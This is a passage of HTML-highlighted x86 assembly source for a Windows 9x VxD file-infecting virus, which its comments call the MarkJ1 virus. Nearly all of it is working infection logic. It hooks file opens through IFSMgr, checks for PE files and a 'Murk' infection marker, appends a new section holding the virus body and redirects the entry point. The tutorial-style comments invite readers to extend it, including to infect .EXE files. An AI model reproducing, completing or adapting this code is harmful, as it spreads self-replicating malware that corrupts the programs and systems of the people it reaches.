        </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                   </span><span class="sc1">;this creates the c:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                      </span><span class="sc1">;takes 1 byte</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                      </span><span class="sc1">;takes two bytes</span><span class="sc0">

</span><span class="sc5">NoNeedDriveLetter</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;character set</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000FF</span><span class="sc0">                 </span><span class="sc1">;max size of output buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;??? copies from Mr k and </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;Fharry virus it seems to  </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004</span><span class="sc0">                 </span><span class="sc1">;to get the input file name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">; which is in unicode</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                      </span><span class="sc1">;where we want the output</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">UniToBcs</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;ok do it</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">20h</span><span class="sc0">                           
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00400041h</span><span class="sc0">
        </span><span class="sc1">;IFSMgr_Service  UniToBCSPath</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;need to clean up the stack</span><span class="sc0">
                                            </span><span class="sc1">; dword size * how many push</span><span class="sc0">
                                            </span><span class="sc1">;(paremeters)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc3">"MOC."</span><span class="sc0">
</span><span class="sc1">;       cmp     dword ptr [esi - 4],"EXE." ;hmm could just put this in to infect</span><span class="sc0">
                                           </span><span class="sc1">;proper files ;&gt;</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ExitVVxD</span><span class="sc0">
</span><span class="sc1">;could add the get and save attributes stuff here as a Xercise for the student</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc2">0000D500h</span><span class="sc0">   </span><span class="sc1">;create/open file</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDIFS</span><span class="sc0">          </span><span class="sc1">;decide to combine this call</span><span class="sc0">
        </span><span class="sc1">;int    20</span><span class="sc0">
        </span><span class="sc1">;dd     00400032h</span><span class="sc0">
        </span><span class="sc1">;IFSMgr_Service  IFSMgr_Ring0_FileIO</span><span class="sc0">

        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">ExitVVxD</span><span class="sc0">   </span><span class="sc1">;error opening the file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;file handle</span><span class="sc0">

</span><span class="sc1">;Read File open with read write d6</span><span class="sc0">
</span><span class="sc1">;3c is the location of the dword pter to the PE/NE part</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000004</span><span class="sc0">             </span><span class="sc1">;how much</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ch</span><span class="sc0">                </span><span class="sc1">;where to read from</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000D600h</span><span class="sc0">            </span><span class="sc1">;read from file</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEPtr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">
                                         </span><span class="sc1">;where to read to</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDIFS</span><span class="sc0">   
        </span><span class="sc1">;int    20h</span><span class="sc0">
        </span><span class="sc1">;dd     00400032h</span><span class="sc0">
       </span><span class="sc1">;IFSMgr_Service  IFSMgr_Ring0_FileIO</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEPtr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">
                                         </span><span class="sc1">;use as a pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000D600h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">
                                         </span><span class="sc1">;where to read to</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDIFS</span><span class="sc0">   
        </span><span class="sc1">;int    20h</span><span class="sc0">
        </span><span class="sc1">;dd     00400032h</span><span class="sc0">
       </span><span class="sc1">;IFSMgr_Service  IFSMgr_Ring0_FileIO                     32</span><span class="sc0">
       </span><span class="sc1">;check for the PE</span><span class="sc0">
</span><span class="sc1">;Read in the first 1k of info from the PE header on</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00004550h</span><span class="sc0">        </span><span class="sc1">;00,'EP'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">CloseFile</span><span class="sc0">

</span><span class="sc1">;Alright!! its a PE file now check if infected</span><span class="sc0">
</span><span class="sc1">;use the user defined 2 words at 44h = Murk</span><span class="sc0">
</span><span class="sc1">;figure file size</span><span class="sc0">
</span><span class="sc1">;figure amout to add</span><span class="sc0">
</span><span class="sc1">;fix header and write end and then write header</span><span class="sc0">
</span><span class="sc1">;all offsets should be off the offset Buffer - offset markj + LoadAt </span><span class="sc0">
</span><span class="sc1">; called PeHeader</span><span class="sc0">

</span><span class="sc1">;Lets do some checks if any fail get out</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PeHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">44</span><span class="sc4">],</span><span class="sc12">'kruM'</span><span class="sc0">      </span><span class="sc1">;user define</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CloseFile</span><span class="sc0">
</span><span class="sc1">;Well not infected with MarkJ1 virus</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PeHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc2">00400000h</span><span class="sc0">          </span><span class="sc1">;base image</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CloseFile</span><span class="sc0">
</span><span class="sc1">;for this example we only want the base image to be 400000h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PeHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">          </span><span class="sc1">;file alignment</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CloseFile</span><span class="sc0">
</span><span class="sc1">;and lastly check the file alignment if 200 we are set </span><span class="sc0">

 
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PeHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;how many sections</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                       </span><span class="sc1">;section size</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;New Section Entry</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">PeHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">                      </span><span class="sc1">;add Pe header size</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;location in PeHeader of new section header</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SectName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SectName</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;get file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d800h</span><span class="sc0">              </span><span class="sc1">;get file size</span><span class="sc0">

       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDIFS</span><span class="sc0">
       </span><span class="sc1">; int    20h</span><span class="sc0">
       </span><span class="sc1">; dd     00400032h</span><span class="sc0">
       </span><span class="sc1">;IFSMgr_Service  IFSMgr_Ring0_FileIO                     </span><span class="sc0">
       </span><span class="sc1">;jc for error</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">],</span><span class="sc8">Eax</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;save the size</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;get it in edx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;save again </span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">         </span><span class="sc1">;make it the 200h size </span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
       
</span><span class="sc1">;Extend the file to a 200 file alignment</span><span class="sc0">
        
       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0"> 
       </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">AtAlignment</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">],</span><span class="sc8">Ecx</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000d601h</span><span class="sc0">           </span><span class="sc1">;write to file</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0c0000000h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDIFS</span><span class="sc0">
       </span><span class="sc1">;int      20h</span><span class="sc0">
       </span><span class="sc1">;dd       00400032h     ;edx is telling us where to write to in the file</span><span class="sc0">
</span><span class="sc5">AtAlignment</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartOfVirus</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000d601h</span><span class="sc0">           </span><span class="sc1">;write to file</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DummyCode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">StartOfVirus</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAt</span><span class="sc0">  
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDIFS</span><span class="sc0">
        </span><span class="sc1">;int      20h</span><span class="sc0">
        </span><span class="sc1">;dd       00400032h       ;edx is telling us where to write to</span><span class="sc0">

</span><span class="sc1">;ok fix the header and write it back</span><span class="sc0">
</span><span class="sc1">;fix marker</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PeHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">],</span><span class="sc12">'kruM'</span><span class="sc0">      </span><span class="sc1">;user define</span><span class="sc0">
</span><span class="sc1">;fix Eip</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">PeHeader</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEPtr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">   </span><span class="sc1">;&lt;----NewEip</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;save the new eip</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PeHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldEipRva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SectName</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PeHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;set the new eip</span><span class="sc0">


</span><span class="sc1">;fix section count</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PeHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
 
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEPtr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">
                                                    </span><span class="sc1">;use as a pointer</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">]</span><span class="sc0">
                                                    </span><span class="sc1">;where to read to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000d601h</span><span class="sc0">           </span><span class="sc1">;write to file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDIFS</span><span class="sc0">
       </span><span class="sc1">; int      20h</span><span class="sc0">
       </span><span class="sc1">; dd       00400032h       ;edx is telling us where to write to</span><span class="sc0">


</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000d700h</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDIFS</span><span class="sc0">
         </span><span class="sc1">;int    20h                              ;402500h</span><span class="sc0">
         </span><span class="sc1">;dd     00400032h</span><span class="sc0">
 </span><span class="sc1">;IFSMgr_Service  IFSMgr_Ring0_FileIO</span><span class="sc0">

 

</span><span class="sc5">ExitVVxD</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Popad</span><span class="sc0">
</span><span class="sc1">;Restore our flag so we can infect the next file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Flag1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">markj</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">LoadAt</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">letOrginal</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1CH</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;040250eh</span><span class="sc0">
